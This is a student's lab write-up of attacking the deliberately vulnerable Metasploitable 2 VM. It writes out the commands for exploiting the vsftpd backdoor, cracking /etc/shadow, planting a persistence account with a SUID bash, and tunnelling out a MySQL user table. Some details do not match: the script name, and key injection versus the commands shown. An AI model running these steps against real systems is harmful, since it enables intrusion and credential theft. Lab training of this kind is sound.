---
author: Samuel Marques
pubDatetime: 2026-03-23
modDatetime: 2026-03-23
title: "Write-up: Metasploitable 2"
ogImage: "Write-up: Metasploitable 2"
slug: metasploitable-2
featured: true
draft: true
tags:
  - exploit
  - ctf
  - vulnerable vm
description: Exploiting Metasploitable 2. Metasploitable 2 is a deliberately
  vulnerable virtual machine designed for practicing penetration testing. It
  contains outdated software and misconfigurations that make it ideal for
  learning exploitation techniques.
---
[Metasploitable 2](https://sourceforge.net/projects/metasploitable/) is a deliberately vulnerable virtual machine developed by Rapid7 to serve as a safe environment for practicing penetration testing and ethical hacking techniques. Unlike production systems, it is intentionally misconfigured and filled with outdated software, insecure services, and exploitable flaws. This makes it an ideal platform for students and professionals to understand how real-world attacks unfold without the risk of harming live systems.

In fact, my school specifically recommended that we use Metasploitable 2 as part of our training for the first month. By working with this environment, we can gain hands-on experience in identifying vulnerabilities, exploiting them, and reflecting on the defensive measures that would prevent such attacks in practice.

This write-up will walk through the process of exploiting Metasploitable 2, focusing on common attack vectors such as weak credentials, misconfigured services, and outdated applications. The objective is not only to demonstrate exploitation techniques but also to highlight the importance of secure configurations, timely patching, and proactive defense strategies. By dissecting these vulnerabilities step by step, we gain valuable insight into how attackers think and operate; knowledge that is essential for building stronger, more resilient systems.


| Tool | Purpose |
| ----------------------------------------- | ---------------------------------------------------------------------- |
| Nmap | Scanning open ports and services |
| Searchsploit | Searching for exploits for given services |
| [MD5 Decrypt](https://md5decrypt.net/en/) | Decrypting MD5 hashes from DWVA users table |
| SSH | Tunneling for remote access for post-exploitation |
| John the Ripper | Decrypting `/etc/passwd` and `/etc/shadow` credentials |
| Unshadower | Combining `/etc/passwd` and `/etc/shadow` credentials in a single file |


## Environment and Goal

To ensure a realistic and controlled penetration testing scenario, the lab was deployed as a cyber range with multiple network segments and a firewall separating the attacker and target machines. This design simulates enterprise environments where internal systems are isolated and protected by perimeter defenses.

- Attacker Machine:
  - Distribution: Kali Linux 2026.1
  - IP Address: `10.0.2.2` 
  - Purpose: Used as the penetration testing platform, equipped with tools such as Nmap, Metasploit Framework, and other utilities for reconnaissance and exploitation.
- Target Machine:
  - Distribution: Metasploitable 2 (Ubuntu-based vulnerable VM)
  - IP Address: `10.6.6.11`
  - Purpose: An intentionally vulnerable system designed for practicing exploitation techniques.

## Reconnaissance

The first step in any engagement is to map the attack surface. Using **Nmap**, a comprehensive service scan was performed to identify open ports, versions, and potential vulnerabilities.

```
nmap -sC -sV -T4 -oA initial_scan 10.6.6.11
```

```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
53/tcp   open  domain      ISC BIND 9.4.2
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp  open  exec        netkit-rsh rexecd
513/tcp  open  login       OpenBSD or Solaris rlogind
514/tcp  open  tcpwrapped
1099/tcp open  java-rmi    GNU Classpath grmiregistry
1524/tcp open  bindshell   Metasploitable root shell
2049/tcp open  nfs         2-4 (RPC #100003)
2121/tcp open  ftp         ProFTPD 1.3.1
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp open  vnc         VNC (protocol 3.3)
6000/tcp open  X11         (access denied)
6667/tcp open  irc         UnrealIRCd
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

The scan revealed over 20 open ports, ranging from standard web services to legacy Unix "r-services." However, one specific entry stood out due to its known historical significance:

- **Port 21 (FTP):** Running `vsftpd 2.3.4`

Using the command-line tool `searchsploit`, the version of the FTP server was cross-referenced against known exploits.

```
searchsploit vsftpd 2.3.4
```

![](</Captura de tela 2026-03-23 182724.png>)

The results indicated a **Backdoor Command Execution** vulnerability. Researching the exploit ([CVE-2011-2523](https://nvd.nist.gov/vuln/detail/CVE-2011-2523)) revealed that this specific version of the source code was compromised at the distribution level. When a username ending in a smiley face `:)` is sent to the server, it triggers a listener on port **6200**, granting a root shell without requiring a valid password.

## Exploitation

Instead of using automated frameworks, a standalone exploit script was sourced from **Exploit-DB** ([EDB-ID: 49757](https://www.exploit-db.com/exploits/49757)). This Python-based script automates the two-stage process of triggering the backdoor and immediately connecting to the resulting shell.

The script was downloaded and executed against the target IP. Unlike manual telnet sessions, the script handles the timing of the "smiley face" trigger precisely.

```
python 17491.py 10.6.6.11
```

The script performs the following network operations:

1. Establishes a TCP connection to **Port 21**
2. Sends the string `USER nergal:)` (the trigger)
3. Sends a dummy password `PASS pass`
4. Immediately attempts to open a socket on **Port 6200**

### Traffic Analysis

By monitoring the attack with **Wireshark**, the script's behavior was verified in real-time. The capture shows the "Three-Way Handshake" (SYN, SYN-ACK, ACK) occurring on port 6200 only *after* the FTP authentication attempt with the smiley face trigger was sent on port 21.

![](/image-33.png)

### Shell Stabilization

Upon successful execution, the script provided a basic root shell. To improve the environment for post-exploitation (allowing for command history and tab completion), the shell was stabilized using the Python PTY module, based on [Upgrading Simple Shells to Fully Interactive TTYs - ropnop blog](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/):

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

![](</Captura de tela 2026-03-23 214803.png>)

## Post-Exploitation and Persistence

With root access confirmed via the `id` command, the focus shifted to maintaining access and extracting high-value data.

### Credential Harvesting

The Linux password files were exfiltrated for offline cracking. The `unshadow` tool was used to combine `/etc/passwd` and `/etc/shadow` into a single file for **John the Ripper**.

```
unshadow passwd shadow > unshadowed

john --wordlist=/usr/share/john/password.lst --rules unshadowed
```

And we got some credentials:

```
sys:batman:3:3:sys:/dev:/bin/sh
klog:123456789:103:104::/home/klog:/bin/false
service:service:1002:1002:,,,:/home/service:/bin/bash
```

### Persistence via SSH

In a real engagement, if the admin restarts the VSFTP service, we lose our shell. We need to stay in. So, to ensure access would survive a service restart, a new administrative user named `support` was created. A public RSA key was then injected into `/home/support/.ssh/authorized_keys`.

```
$ useradd -m -s /bin/bash support
$ echo "support:password" | chpasswd
$ chmod u+s /bin/bash
```

![Captura de tela 2026-03-23 193553.png](</Captura de tela 2026-03-23 193553.png>)

### Database Exfiltration (DVWA)

Inside the web directory `/var/www/dvwa/config/`, the `config.inc.php` file was discovered. It contained plaintext credentials for the internal MySQL database.

```
$DBMS = 'MySQL';
#$DBMS = 'PGSQL';

# Database variables
$_DVWA = array();
$_DVWA[ 'db_server' ] = 'localhost';
$_DVWA[ 'db_database' ] = 'dvwa';
$_DVWA[ 'db_user' ] = 'root';
$_DVWA[ 'db_password' ] = '';

# Only needed for PGSQL
$_DVWA[ 'db_port' ] = '5432'; 
```

Since the database was restricted to `localhost`, an **SSH Tunnel** was established to bridge port 3306 on the target to port 3307 on the attacker machine:

```
ssh -L 3307:127.0.0.1:3306 support@10.6.6.11 -oHostKeyAlgorithms=+ssh-rsa
```

The command **-oHostKeyAlgorithms=+ssh-rsa** was made necessary, because Metasploitable 2 is so old that modern Kali versions consider its SSH keys "insecure" and refuse to connect by default.

The SSH tunnel allowed for a remote dump of the `dvwa.users` table, revealing MD5-hashed passwords for web application users, which were subsequently decrypted to gain full administrative access to the web portal.

![Captura de tela 2026-03-23 201408.png](</Captura de tela 2026-03-23 201408.png>)

![Captura de tela 2026-03-23 201954.png](</Captura de tela 2026-03-23 201954.png>)


| Username | Password |
| -------- | -------- |
| admin | password |
| gordonb | abc123 |
| 1337 | charley |
| pablo | letmein |
| smithy | password |


![Captura de tela 2026-03-23 202018.png](</Captura de tela 2026-03-23 202018.png>)

## Lessons Learned and Conclusion

The exploitation of Metasploitable 2 provided a comprehensive look at the full lifecycle of a cyberattack. Beyond the initial "entry point", this engagement highlighted several critical security principles.

"Root" is rarely the end of an attack. By creating a secondary administrative user and injecting a public SSH Key, we established persistence. This proved that an attacker can maintain control even if the original VSFTPD vulnerability is patched or the service is restarted. Furthermore, we used SSH Tunneling**** to bypass "local-only" database restrictions, proving that internal network blocks are easily circumvented once an OS-level foothold is established.

We identified a critical backdoor in the VSFTP service (CVE-2011-2523) that allowed for unauthenticated root access. Using this access, we bypassed local-only database restrictions via SSH tunneling and successfully exfiltrated the entire customer database. Furthermore, we established a persistent administrative backdoor that would survive a service restart.

### Remediation

To secure this system, the `vsftpd` service must be updated immediately to a verified, modern version, and all legacy "r-services" should be disabled. Password hygiene is also vital; even if the application is patched, the system remains at risk if service accounts like `postgres` or `service` retain weak, crackable credentials.

&nbsp;